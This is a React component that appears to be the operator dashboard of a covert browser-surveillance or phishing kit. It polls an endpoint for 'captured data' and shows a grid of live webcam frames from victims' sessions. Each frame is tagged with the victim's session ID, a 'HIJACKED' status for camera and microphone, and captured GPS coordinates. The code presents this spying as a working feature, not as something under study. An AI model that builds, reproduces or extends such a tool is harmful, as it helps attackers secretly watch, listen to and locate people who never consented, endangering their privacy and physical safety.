'use client'

import { useState, useEffect } from 'react'
import { Camera, Mic, MapPin, Wifi } from 'lucide-react'
import WebRTCViewer from './WebRTCViewer'

interface VideoFeed {
  sessionId: string
  frame: string
  timestamp: string
  hasVideo: boolean
  hasAudio: boolean
  location?: { lat: number, lon: number }
}

export default function LiveSurveillance() {
  const [videoFeeds, setVideoFeeds] = useState<Map<string, VideoFeed>>(new Map())

  useEffect(() => {
    // Poll for surveillance data (reduced frequency to reduce load)
    const interval = setInterval(fetchSurveillanceData, 5000)
    fetchSurveillanceData()
    
    return () => {
      clearInterval(interval)
    }
  }, [])

  const fetchSurveillanceData = async () => {
    try {
      const response = await fetch('/api/captured-data')
      if (response.ok) {
        const data = await response.json()
        
        // Process video frames and permissions data
        data.forEach((item: any) => {
          if (item.type === 'video_surveillance' && item.frame) {
            setVideoFeeds(prev => {
              const newMap = new Map(prev)
              newMap.set(item.sessionId, {
                sessionId: item.sessionId,
                frame: item.frame,
                timestamp: item.timestamp,
                hasVideo: item.hasVideo || true,
                hasAudio: item.hasAudio || false
              })
              return newMap
            })
          }
          
          if (item.type === 'permissions' && item.location_captured) {
            const [lat, lon] = item.location_captured.split(',').map(Number)
            setVideoFeeds(prev => {
              const newMap = new Map(prev)
              const existing = newMap.get(item.sessionId)
              if (existing) {
                existing.location = { lat, lon }
                newMap.set(item.sessionId, existing)
              }
              return newMap
            })
          }
        })
      }
    } catch (error) {
      console.error('Failed to fetch surveillance data:', error)
    }
  }

  if (videoFeeds.size === 0) {
    return null
  }

  return (
    <div className="bg-black border border-red-600 rounded-lg overflow-hidden">
      <div className="bg-red-600 px-4 py-2 text-white font-mono text-sm">
        🔴 LIVE VIDEO SURVEILLANCE - {videoFeeds.size} ACTIVE FEED{videoFeeds.size !== 1 ? 'S' : ''}
      </div>
      
      <div className="p-4 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {Array.from(videoFeeds.entries()).map(([sessionId, feed]) => (
          <div key={sessionId} className="relative">
            <div className="bg-gray-900 rounded-lg overflow-hidden border-2 border-red-500">
              {/* Video Feed */}
              <div className="relative">
                <img 
                  src={feed.frame} 
                  alt="Live surveillance feed"
                  className="w-full h-48 object-cover"
                />
                
                {/* Live indicator */}
                <div className="absolute top-2 right-2 bg-red-600 text-white px-2 py-1 rounded text-xs font-bold animate-pulse">
                  🔴 LIVE
                </div>
                
                {/* Session ID */}
                <div className="absolute bottom-2 left-2 bg-black/70 text-white px-2 py-1 rounded text-xs font-mono">
                  {sessionId.slice(0, 8)}...
                </div>
              </div>
              
              {/* Info Panel */}
              <div className="bg-black p-3 space-y-2">
                <div className="flex items-center gap-2 text-xs">
                  <Camera size={14} className={feed.hasVideo ? 'text-green-400' : 'text-gray-500'} />
                  <span className={feed.hasVideo ? 'text-green-400' : 'text-gray-500'}>
                    Camera: {feed.hasVideo ? 'HIJACKED' : 'NO ACCESS'}
                  </span>
                </div>
                
                <div className="flex items-center gap-2 text-xs">
                  <Mic size={14} className={feed.hasAudio ? 'text-purple-400' : 'text-gray-500'} />
                  <span className={feed.hasAudio ? 'text-purple-400' : 'text-gray-500'}>
                    Microphone: {feed.hasAudio ? 'HIJACKED' : 'NO ACCESS'}
                  </span>
                </div>
                
                <div className="flex items-center gap-2 text-xs">
                  <Wifi size={14} className="text-blue-400" />
                  <span className="text-blue-400">
                    Last Update: {new Date(feed.timestamp).toLocaleTimeString()}
                  </span>
                </div>
              </div>
            </div>
            
            {/* GPS Location */}
            {feed.location && (
              <div className="mt-2 bg-black p-2 rounded border border-blue-500">
                <div className="flex items-center gap-2 text-blue-400 text-xs">
                  <MapPin size={14} />
                  <span>GPS: {feed.location.lat.toFixed(4)}, {feed.location.lon.toFixed(4)}</span>
                </div>
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  )
}